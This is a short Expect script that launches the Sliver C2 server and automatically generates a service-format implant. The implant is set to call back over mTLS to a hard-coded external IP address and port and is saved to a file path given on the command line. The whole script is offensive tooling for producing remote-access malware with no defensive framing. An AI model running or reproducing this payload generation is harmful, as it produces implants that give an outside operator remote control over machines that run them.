#!/usr/bin/expect

if {$argc != 1} {
    puts "Usage: $argv0 <file_path>"
    exit 1
}

set file_path [lindex $argv 0]

# Activate Sliver server
spawn sliver-server

# Wait for sliver-server to start (you can adjust the sleep duration as needed)
sleep 1

# Generate the payload
send "generate --format service --mtls 18.143.102.216:8080 --save $file_path\r"

# # Wait for the file $payload_c to exist
set timeout 100
expect {
    timeout {
        exit 0
    }
}